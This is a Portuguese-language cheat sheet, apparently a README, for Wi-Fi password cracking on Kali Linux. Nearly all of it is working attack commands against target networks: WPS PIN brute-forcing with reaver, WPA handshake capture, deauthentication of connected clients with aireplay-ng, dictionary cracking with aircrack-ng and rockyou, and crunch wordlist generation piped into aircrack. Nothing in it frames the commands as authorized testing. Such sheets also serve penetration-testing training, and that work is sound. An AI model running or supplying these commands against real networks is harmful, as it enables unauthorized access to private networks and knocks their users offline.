# Wifi Hacking -- Kali Linux
### (by Walysson dos Reis)
---------------------
### WPS Cracking com Reaver
* `airmon-ng check kill` - Interrompe processos que estejam utilizando a placa wifi
* `airmon-ng start wlan0` - Coloca a interface wifi wlan0 em modo de monitoramento
* `wash -i wlan0mon` - Ativa descoberta de redes disponivel na interface wlan0mon
* `reaver -i mon0 -c 1 -b 00:00:00:00:00:00 -vv` - Inicie o reaver inserindo interface, canal e bssid da rede alvo
* `reaver -i mon0 -c 1 -b 00:00:00:00:00:00  -vv -L -N -d 15 -T .5 -r 3:15` - Reavear com parâmetros de intervalo opcional

### Hacking Wifi WPA-PSK com Aircrack
* `airmon-ng check kill` - Interrompe processos que estejam utilizando a placa wifi
* `airmon-ng start wlan0` - Coloca a interface wifi wlan0 em modo de monitoramento
* `airodump-ng wlan0mon` - Usado para descoberta de redes disponivel na interface wlan0mon
* `wash -i wlan0mon` - Usado para descoberta de redes disponivel na interface wlan0mon em realação ao WPS
* `airodump-ng --bssid 00:00:00:00:00:00 -c 1 --write ArqCAP wlan0mon` - Inicia o modo de captura da rede alvo 
* `aireplay-ng --deauth 100 -a 00:00:00:00:00:00 wlan0mon` - Em outro terminal com modo de captura rodando execute para derrubar a rede alvo
* Ao retornar ao terminal de captura verifique se houve captura do pacote se for exibido a mensagem "WPA handshake"
* Com pacote com a senha capturado devemos usar Wordlists para tentar quebrar a senha
* /usr/share/wordlists/rockyou.txt.gz - Wordlist padrão do Kali Linux
* `gzip -d rockyou.txt.gz` - Descompacta o arquivo de wordlist deletando o arquivo zipado
* `aircrack-ng ArqCap-01.cap -w rockyou.txt` - Inicia o processo de teste de senha utilizando o arquivo de wordlist
* `grep -E '^.{8,63}$' < rockyou.txt >> rockyou_wpa_passwd.txt` -  Filtra o arquivo rockyou para senhas WPA/WPA2 (8-63 caracteres)

### Crunch : Gerador de Wordlist
* `crunch <min> <max> [opções] ` - Uso padrão do Crunch
*  lowUP123 @% # (letras minúsculas, letras maiúsculas, números e símbolos) - Ordem de Charset no Crunch
* Principais parâmetros do crunch:
    * -b: Tamanho máximo da lista de palavras (requer -o START)
    * -c: números de linhas para escrever na lista de palavras (requer -o START)
    * -d: limita o número de caracteres duplicados
    * -e: para de gerar palavras em um determinado string
    * -f: especifica uma lista de conjuntos de caracteres do arquivo charset.lst
    * -i: inverte a ordem dos caracteres na lista de palavras
    * -l: permite a interpretação literal de @,% ^ ao usar -t
    * -o: o arquivo de lista de saída
    * -p: imprime permutações sem repetir caracteres (não pode ser usado com -s)
    * -q: Como a opção -p, exceto a leitura das sequências de um arquivo especificado
    * -r: retoma uma sessão anterior (não pode ser usada com -s)
    * -s : especifique uma string específica para iniciar a lista de palavras com
    * -t: define um padrão específico de @,% ^
    * -z: comprime o arquivo da lista de saída, acompanhado de -o
 * Refência do crunch:
    * @ representa letras minúsculas
    * , representa letras maiúsculas
    * % representa números
    * ^ representa caracteres especiais
 * `crunch 4 6 1234567890 -o /root/numerica6-8.txt` - Exemplo de geração de lista
 * `crunch 9 9 1234567890 -t maria@@@@ -o /tmp/wordlist-maria.txt` - Exemplo de geração de lista
 * Charset.lst: /usr/share/crunch/charset.lst
    * Conjunto de caracteres disponíveis no charset.lst:
      * lalpha: apenas letras minúsculas
      * ualpha: apenas letras maiúsculas
      * lalpha-numeric: letras minúsculas e números
      * ualpha-numeric: letras maiúsculas e números
      * lalpha-numeric-all-space: letras minúsculas, números e caracteres especiais como ?, ;, :, espaço, etc.;
      * ualpha-numeric-all-space: letras maiúsculas, números e caracteres especiais como ?, ;, :, espaço, etc.;
      * mixalpha: letras minúsculas e maiúsculas;
      * mixalpha-numeric-all-space: letras maiúsculas, minúsculas, números, caracteres especiais e espaço. 
* `crunch 4 8 -f charset.lst mixalpha -o /root/lista-com-charset.txt` - Exemplo de geração de lista
* `crunch 8 8 -f charset.lst mixalpha-numeric-all-space -t @@abc@@@ -o /root/wordlist-gigante.txt` - Exemplo de geração de lista
* `crunch 4 4 -f charset.lst mixalpha-numeric-all-space -o /root/thekingwordlist4-4.txt` - Exemplo de geração de lista
* `crunch 8 8 abcdefghijklmnopqrstuvxz 1234567890 | aircrack --bssid 00:1D:AA:9D:27:AC -w- 'root/handshakes/Cafelocuraceb-00:1D:AA:9D:27:AC.cap` - Exemplo de geração
--------
## Referências
https://outpost24.com/blog/wps-cracking-with-reaver  
https://cienciacomputacao.com.br/tutorial/como-hackear-wi-fi-wpa2-psk-com-kali-linux/  
https://www.cyberpratibha.com/blog/how-do-i-use-rockyou-wordlist-txt-in-kali-linux/  
https://deadpackets.wordpress.com/2012/11/11/wireless-fun-crackeando-wpawpa2/
https://nsworld.com.br/crunch-gerador-de-wordlist/  
https://nsworld.com.br/aircrack-ng-pacote-de-ferramentas-para-monitorizar-e-analisar-redes-sem-fio/
https://nsworld.com.br/cracking-wpa-com-aircrack-ng/  

